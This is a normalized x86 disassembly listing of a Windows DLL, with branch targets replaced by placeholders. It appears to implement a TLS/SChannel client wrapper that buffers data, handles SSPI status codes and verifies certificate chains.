mov edi [ ebp + 0x8 ]
push edi
push 0x4
push [ ecx + 0x28 ]
call [ eax + 0x2c ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x10 ]
call sub_10003218
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call _CxxThrowException
sub_1000372d
mov eax sub_1000508a
call _EH_prolog
sub esp 0x40
push ebx
push esi
push edi
mov esi ecx
push 0x1
xor ebx ebx
mov eax [ esi + 0x2c ]
pop ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x48 ] ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x14 ]
push 0x2
mov [ ebp - 0x34 ] ecx
pop edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] ebx
push ecx
mov [ ebp - 0x38 ] edi
push [ esi + 0x28 ]
mov [ ebp - 0x3c ] 0x4
call [ eax + 0x28 ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
jge r-xdata
mov eax [ esi + 0x28 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov ecx [ esi + 0x2c ]
push ebx
push ebx
push 0x10
push ebx
push 0xc11c
push ebx
push eax
push [ esi + 0x24 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] ebx
call [ ecx + 0x18 ]
cmp eax ebx
jge r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov edi [ ebp - 0x34 ]
cmp edi ebx
je r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
xor eax eax
push [ ebp - 0x18 ]
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_10003218
jmp r-xdata
mov eax [ esi + 0x28 ]
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x20 ]
call sub_10003218
jmp r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4c ]
call sub_10004182
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ eax + 0x4 ] 0xffffffff
je r-xdata
push [ ebp - 0x3c ]
mov ecx esi
push edi
call sub_10003e5d
cmp al bl
jne r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
push 0x1
mov ecx esi
call sub_100040ca
mov eax [ esi + 0x2c ]
push edi
call [ eax + 0x40 ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x20 ]
call sub_100032ff
jmp r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
sub_100038ee
mov eax sub_100050ba
call _EH_prolog
sub esp 0x60
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
mov edi ecx
push eax
call sub_100036aa
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
add ecx edx
and [ ebp - 0x2c ] 0x0
add eax ecx
mov ecx [ edi + 0x2c ]
mov [ ebp - 0x60 ] ecx
lea ecx [ ebp - 0x5c ]
xor ebx ebx
mov [ ebp - 0x68 ] 0x4
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x6c ] ebx
push eax
mov [ ebp - 0x4 ] ebx
call [ malloc@IAT ]
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x28 ]
push ebx
add eax esi
push [ ebp + 0x8 ]
push eax
call memcpy
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x5c ] eax
add eax esi
mov [ ebp - 0x48 ] eax
add esp 0xc
mov [ ebp - 0x50 ] ebx
add eax ebx
mov [ ebp - 0x44 ] ecx
xor ebx ebx
lea ecx [ ebp - 0x6c ]
push ebx
push ecx
push ebx
push [ edi + 0x28 ]
mov [ ebp - 0x3c ] eax
mov eax [ edi + 0x2c ]
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] 0x1
mov [ ebp - 0x40 ] 0x6
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
call [ eax + 0x64 ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jge r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x50 ]
add eax ecx
mov ecx edi
add eax [ ebp - 0x44 ]
push eax
push esi
call sub_10003e5d
test al al
push esi
jne r-xdata
cmp eax 0x80090317
je r-xdata
xor eax eax
push ebx
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_10003218
jmp r-xdata
call [ free@IAT ]
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
call sub_100041dc
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
call [ free@IAT ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
push esi
call [ free@IAT ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x10 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x8 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_100032ff
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x8 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x10 ]
call sub_10003218
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call _CxxThrowException
sub_10003ae2
mov eax sub_100050ea
call _EH_prolog
sub esp 0x5c
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] ebx
mov esi ecx
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp + 0xc ]
add eax [ esi + 0x34 ]
push eax
mov [ ebp + 0xc ] eax
call [ malloc@IAT ]
cmp eax ebx
pop ecx
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x34 ]
mov edx [ ebp + 0xc ]
sub edx ecx
add ecx eax
push edx
push [ ebp + 0x8 ]
push ecx
call memcpy
mov eax [ esi + 0x34 ]
mov edi [ free@IAT ]
add esp 0xc
cmp eax ebx
jbe r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
cmp [ esi + 0x14 ] bl
je r-xdata
push eax
push [ esi + 0x3c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
push [ esi + 0x3c ]
call edi
add esp 0x10
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
xor eax eax
push ebx
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_10003218
jmp r-xdata
mov eax [ esi + 0x2c ]
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x64 ] 0x4
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ebx
push 0x1
mov [ ebp - 0x48 ] ebx
pop ecx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x54 ] ecx
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x50 ] ecx
lea ecx [ ebp - 0x68 ]
push ebx
push ecx
push [ esi + 0x28 ]
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x2c ] ebx
call [ eax + 0x68 ]
cmp eax 0x80090318
mov [ ebp - 0x14 ] eax
je r-xdata
lea eax [ ebp - 0x24 ]
mov ecx esi
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_10003352
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x68 ]
mov [ esi + 0x34 ] eax
call sub_100041dc
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
cmp eax 0x90317
je r-xdata
cmp eax 0x90321
je r-xdata
push [ ebp - 0x10 ]
call edi
pop ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
push ebx
call operator new
pop ecx
push ebx
push eax
mov ecx esi
call sub_100038ee
push 0x1
mov ecx esi
call sub_100040ca
push [ ebp - 0x10 ]
call edi
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
push 0x3
xor ecx ecx
mov [ ebp + 0x8 ] ebx
lea eax [ ebp - 0x4c ]
pop edx
cmp eax 0x90317
jne r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
call edi
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
xor eax eax
push ebx
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_10003218
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
push [ ebp - 0x10 ]
call edi
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
add eax 0xc
dec edx
jne r-xdata
cmp [ eax + 0x4 ] 0x5
jne r-xdata
mov ecx eax
xor eax eax
push [ ebp - 0x14 ]
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_10003218
jmp r-xdata
cmp ecx ebx
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
cmp eax ebx
jbe r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ eax ]
push [ eax + 0x8 ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp + 0x8 ]
add esp 0xc
mov eax [ eax ]
mov [ ebp + 0xc ] eax
jmp r-xdata
push eax
push [ ecx + 0x8 ]
mov ecx esi
call sub_10003e89
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x68 ]
call sub_100041dc
cmp [ ebp - 0x14 ] 0x90321
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x68 ]
call sub_100041dc
jmp r-xdata
push esi
call [ esi + 0x8 ]
cmp [ ebp + 0x8 ] ebx
pop ecx
lea eax [ ebp - 0x24 ]
mov [ esi + 0x14 ] 0x1
mov [ ebp - 0x18 ] ebx
push eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x10 ]
jmp r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
call edi
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov ecx esi
call sub_10003352
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_10003e5d
push esi
push edi
push [ esp + 0x10 ]
mov esi ecx
call ??2@YAPAXI@Z
push [ esp + 0x14 ]
mov edi eax
push [ esp + 0x14 ]
push edi
call memcpy
push [ esp + 0x20 ]
push edi
call [ esi ]
add esp 0x18
pop edi
pop esi
retn 0x8
sub_10003e89
push esi
push edi
push [ esp + 0x10 ]
mov esi ecx
call ??2@YAPAXI@Z
push [ esp + 0x14 ]
mov edi eax
push [ esp + 0x14 ]
push edi
call memcpy
push [ esp + 0x20 ]
push edi
call [ esi + 0x4 ]
add esp 0x18
pop edi
pop esi
retn 0x8
sub_10003eb6
mov eax sub_10005108
call _EH_prolog
sub esp 0x1c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x2c ] ebx
mov [ ebp - 0x10 ] esp
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or edi 0xffffffff
push 0x38
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x14 ] bl
mov [ ebp - 0x4 ] ebx
call ??2@YAPAXI@Z
pop ecx
mov [ esi + 0x20 ] eax
push 0x8
call operator new
pop ecx
mov [ esi + 0x24 ] eax
push 0x8
call operator new
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x24 ]
pop ecx
mov [ ebp - 0x4 ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
push 0x38
push ebx
mov [ eax + 0x4 ] edi
mov eax [ esi + 0x28 ]
mov [ eax ] edi
mov eax [ esi + 0x28 ]
mov [ eax + 0x4 ] edi
push [ esi + 0x20 ]
call memset
lea eax [ ebp - 0x18 ]
mov [ esi + 0x2c ] ebx
push eax
push ebx
mov [ esi + 0x30 ] ebx
mov [ ebp - 0x18 ] ebx
call sub_1000423f
add esp 0x14
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x2c ] eax
push 0x18
call operator new
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x28 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_10003218
jmp r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
mov [ ebp - 0x4 ] edi
call _CxxThrowException
sub_10003fad
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x28 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_10003218
jmp r-xdata
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
sub_10003ffb
mov eax sub_1000511e
call _EH_prolog
sub esp 0x18
mov eax [ ecx + 0x20 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x10 ] esi
mov [ eax ] 0x4
cmp [ ebp - 0x10 ] esi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ecx + 0x20 ]
lea edx [ ebp - 0x24 ]
or [ eax + 0x30 ] 0x1a
push edx
push [ ecx + 0x24 ]
mov eax [ ecx + 0x2c ]
push esi
push esi
push [ ecx + 0x20 ]
push esi
push 0x2
push rw-data
push esi
call [ eax + 0xc ]
mov edi eax
cmp edi esi
je r-xdata
mov eax [ ecx + 0x20 ]
lea edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
mov [ eax + 0x8 ] edx
cmp [ ebp - 0x10 ] esi
je r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax esi
mov [ ebp - 0x4 ] esi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
push [ ebp - 0x10 ]
call [ CertFreeCertificateContext@IAT ]
xor eax eax
push edi
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x1c ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_10003218
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
call _CxxThrowException
sub_100040ca
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x34 ] ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] bl
jbe r-xdata
mov eax [ esi + 0x28 ]
push edi
or edi 0xffffffff
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
cmp [ eax ] edi
je r-xdata
push [ esi + 0x3c ]
call [ free@IAT ]
pop ecx
mov eax [ esi + 0x24 ]
cmp [ eax ] edi
je r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
cmp [ esp + 0x10 ] bl
pop edi
jne r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
mov ecx [ esi + 0x2c ]
push eax
call [ ecx + 0x24 ]
mov eax [ esi + 0x28 ]
mov [ eax ] edi
mov eax [ esi + 0x28 ]
mov [ eax + 0x4 ] edi
pop esi
pop ebx
retn 0x4
push [ esi + 0x18 ]
call ??3@YAXPAX@Z
push [ esi + 0x20 ]
call operator delete
push [ esi + 0x24 ]
call operator delete
push [ esi + 0x28 ]
call operator delete
mov eax [ esi + 0x30 ]
add esp 0x10
cmp eax ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
je r-xdata
mov ecx [ esi + 0x2c ]
push eax
call [ ecx + 0x10 ]
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax + 0x4 ] edi
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] ebx
sub_100041b6
push edi
mov edi ecx
cmp [ edi + 0x28 ] 0x0
je r-xdata
pop edi
retn
push ebx
push esi
push 0x2
lea esi [ edi + 0x18 ]
pop ebx
mov eax [ edi + 0xc ]
push [ esi ]
call [ eax + 0x40 ]
and [ esi ] 0x0
add esi 0xc
dec ebx
jne r-xdata
pop esi
pop ebx
sub_100041dc
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
je r-xdata
pop edi
retn
push ebx
push esi
push 0x4
lea esi [ edi + 0x18 ]
pop ebx
mov eax [ edi + 0xc ]
push [ esi ]
call [ eax + 0x40 ]
and [ esi ] 0x0
add esi 0xc
dec ebx
jne r-xdata
pop esi
pop ebx
sub_10004202
push ebp
mov ebp esp
push ecx
mov al [ ecx + 0x8 ]
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ecx + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
mov ecx edi
mov [ edi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx edi
push [ eax ]
push 0x0
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax edi
pop edi
pop esi
leave
retn 0x4
sub_1000423f
push ebp
mov ebp esp
sub esp 0x198
cmp [ ebp + 0x8 ] 0x0
push esi
jne r-xdata
mov al 0x1
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x84 ] 0x2
jne r-xdata
pop esi
leave
retn
cmp [ ebp - 0x84 ] 0x1
jne r-xdata
cmp [ ebp - 0x90 ] 0x4
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x198 ]
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ FreeLibrary@IAT ]
call eax
mov ecx [ ebp + 0xc ]
test eax eax
mov [ ecx ] eax
jne r-xdata
sub_100042e1
push ebp
mov ebp esp
sub esp 0x54
lea eax [ ebp - 0x8 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push 0x53
xor ebx ebx
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ eax + 0x2c ]
test eax eax
jne r-xdata
xor al al
cmp [ ebp - 0x8 ] ebx
je r-xdata
push esi
push 0x10
pop esi
lea eax [ ebp - 0x30 ]
push esi
push ebx
push eax
call memset
mov al [ ebp + 0x8 ]
add esp 0xc
neg al
sbb eax eax
mov [ ebp - 0x30 ] esi
and eax 0x2
mov [ ebp - 0x2c ] 0x1
inc eax
cmp [ ebp + 0x8 ] bl
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] rw-data
mov [ ebp - 0xc ] rw-data
mov [ ebp + 0x10 ] rw-data
lea eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea eax [ ebp - 0x30 ]
push ebx
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x10 ]
push ebx
push eax
push ebx
call [ CertGetCertificateChain@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call memset
xor eax eax
cmp [ ebp + 0x8 ] bl
push 0xc
mov [ ebp - 0x40 ] esi
setne al
inc eax
pop esi
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x34 ] eax
push esi
lea eax [ ebp - 0x20 ]
push ebx
push eax
call memset
push 0x14
mov [ ebp - 0x20 ] esi
lea eax [ ebp - 0x40 ]
pop esi
mov [ ebp - 0x18 ] eax
push esi
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0x24
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x54 ] esi
push eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x4 ]
push 0x4
call [ CertVerifyCertificateChainPolicy@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov esi [ ebp + 0x1c ]
mov [ ebp + 0xb ] 0x1
cmp esi ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
mov [ ebp - 0x4 ] ebx
mov al [ ebp + 0xb ]
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CertFreeCertificateChain@IAT ]
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x8 ]
call ??2@YAPAXI@Z
mov edi eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push edi
call memcpy
mov eax [ ebp - 0x50 ]
add esp 0x10
mov [ esi ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0xb ] bl
mov eax [ eax ]
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] eax
pop edi
pop ebx
leave
retn
sub_1000447c
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
push 0x0
push 0x0
push ebx
call [ fseek@IAT ]
mov esi [ fread@IAT ]
add esp 0xc
call [ GetLastError@IAT ]
and [ ebp - 0x28 ] bl
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
